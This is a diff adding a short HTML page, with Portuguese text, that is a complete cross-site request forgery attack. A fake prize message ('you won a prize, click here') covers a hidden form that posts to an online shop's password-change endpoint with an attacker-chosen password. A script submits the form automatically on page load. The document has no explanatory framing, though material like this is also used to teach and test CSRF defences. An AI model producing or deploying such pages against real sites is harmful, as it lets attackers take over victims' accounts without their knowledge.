@@ -1,0 +1,11 @@
+<p>Olá! Você ganhou um prêmio, clique aqui para resgatar!</p>
+
+<form id="csrf-form" action="http://loja-online.com/alterar_senha" method="POST">
+    <input type="hidden" name="senha_nova" value="senha_do_atacante123">
+    <input type="hidden" name="senha_confirmacao" value="senha_do_atacante123">
+</form>
+
+<script>
+    // Envia o formulário automaticamente quando a página é carregada
+    document.getElementById("csrf-form").submit();
+</script>
